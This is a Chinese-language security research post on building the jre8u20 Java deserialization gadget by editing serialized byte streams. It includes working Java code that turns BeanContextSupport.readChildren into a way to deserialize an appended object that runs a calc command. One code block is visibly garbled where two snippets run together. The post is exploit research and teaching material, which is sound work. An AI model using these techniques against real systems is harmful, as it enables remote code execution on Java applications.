# 起因
在看`jre8u20`这个`Gadget`的时候，通过阅读其他师傅的文章，感觉原理自己似乎是弄懂了，但是无论如何写不出来。无论是`pwntester`全手动构造序列化字节码，还是`n1nty`师傅或者`haby0`师傅的方式，逻辑都挺复杂。`SerialWriter`的方式最具有扩展性，但是又要去看新的代码，实在不想看也看不懂；修改`ObjectOutputStream`反序列化逻辑的方式似乎是个相对简单的办法，但是改着改着我自己逻辑就晕了；全手动构造序列化字节码看起来最简单，但是如何修改偏移量让人发狂，虽然`lightless`师傅已经做了示例，可那么一大堆反序列化字节码确实让人望而却步。那能不能有一种更简单的方式来构造`jre8u20`的`Gadget`呢？运气不错，果然被我发现了一个。
# 3个小知识点
## 1.jdk7u21 中的 LinkedHashSet 也可以加入其他对象
在`jdk7u21`中使用哈希碰撞的方式触发了`RCE`，但是通常都是只向`LinkedHashSet`中塞了`2`个对象，其实只要塞入了特定的那`2`个对象，再塞入多少个其他的对象完全无所谓。如下图所示，向`LinkedHashSet`中又塞入了一个字符串，但是并不影响整个流程的运行。  
## 2\. 通过修改反序列化字节码修改 LinkedHashSet 中的元素个数
    ByteArrayOutputStream baous = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baous);
            LinkedHashSet set = new LinkedHashSet();
            set.add("aaa");
            oos.writeObject(set);
            oos.writeObject("bbb");
            oos.writeObject("ccc");
            oos.close();
            byte[] bytes = baous.toByteArray();
            //修改hashset的长度（元素个数）,由 1 修改为 3
            bytes[89] = 3;
            //调整 TC_ENDBLOCKDATA 标记的位置
            //97 = a
            for(int i = 0; i  0 && this.equals(getBeanContextPeer()))
                    readChildren(ois);
                deserialize(ois, bcmListeners = new ArrayList(1));
            }
        }
     public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            int count = serializable;
            while (count-- > 0) {
                Object                      child = null;
                BeanContextSupport.BCSChild bscc  = null;
                try {
                    child = ois.readObject();
                    bscc  = (BeanContextSupport.BCSChild)ois.readObject();
                } catch (IOException ioe) {
                    continue;
                } catch (ClassNotFoundException cnfe) {
                    continue;
                }
            ...
    }
我们可以通过修改字节码的方式，让`BeanContextSupport`在反序列化时，反序列化其随后的对象，代码如下：
    //此 demo 需要运行 jdk <= 7u20 的情况下运行，如果大于此版本，需要调整
            BeanContextSupport bcs = new BeanContextSupport();
            Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
            Field serializable = cc.getDeclaredField("serializable");
            serializable.setAccessible(true);
            serializable.set(bcs, 0);
            Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
            beanContextChildPeer.set(bcs, bcs);
            ByteArrayOutputStream baous = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baous);
            oos.writeObject(bcs);
            oos.writeObject(new Payload());
            oos.close();
            byte[] bytes = baous.toByteArray();
            //将 serializable 的值修改为 1
            //0x73 = 115, 0x78 = 120
            //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
            for(int i = 0; i < bytes.length; i++){
                if(bytes[i] == 120 && bytes[i+1] == 0 && bytes[i+2] == 1 && bytes[i+3] == 0 &&
                        bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 115){
                    bytes[i+6] = 1;
                    break;
                }
            }
            /**
                 TC_BLOCKDATA - 0x77
                 Length - 4 - 0x04
                 Contents - 0x00000000
                 TC_ENDBLOCKDATA - 0x78
             **/
            //把这部分内容先删除，再附加到最后
            //0x77 = 119, 0x78 = 120
            //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
            for(int i = 0; i < bytes.length; i++){
                if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                        bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 120){
                    bytes = Util.deleteAt(bytes, i);
                    bytes = Util.deleteAt(bytes, i);
                    bytes = Util.deleteAt(bytes, i);
                    bytes = Util.deleteAt(bytes, i);
                    bytes = Util.deleteAt(bytes, i);
                    bytes = Util.deleteAt(bytes, i);
                    bytes = Util.deleteAt(bytes, i);
                    break;
                }
            }
            bytes = Util.addAtLast(bytes, (byte) 0x77);
            bytes = Util.addAtLast(bytes, (byte) 0x04);
            bytes = Util.addAtLast(bytes, (byte) 0x00);
            bytes = Util.addAtLast(bytes, (byte) 0x00);
            bytes = Util.addAtLast(bytes, (byte) 0x00);
            bytes = Util.addAtLast(bytes, (byte) 0x00);
            bytes = Util.addAtLast(bytes, (byte) 0x78);
            FileOutputStream fileOutputStream = new FileOutputStream("case2.ser");
            fileOutputStream.write(bytes);
            fileOutputStream.close();
            //反序列化
            FileInputStream fis = new FileInputStream("case2.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
            ois.close();
我们在 `oos.writeObject(bcs)`之后，又向序列化流中写入了Payload对象`oos.writeObject(new
Payload())`，`Payload`的代码非常简单
    public class Payload implements Serializable {
        public Payload() throws IOException {
            Runtime.getRuntime().exec("calc");
        }
    }
我们修改了字节码，使`BeanContextSupport`中`serializable`值变为1，随后将`Paylaod`对象的反序列化字节码往前挪了挪，从而再反序列化时，`BeanContextSupport`在反序列化完毕后，进入`readChildren`逻辑，进而反序列了`Payload`,运行结果可以说明这个问题。  
其中，上述修改字节码代码的逻辑可以简单的用下面这张图进行说明。  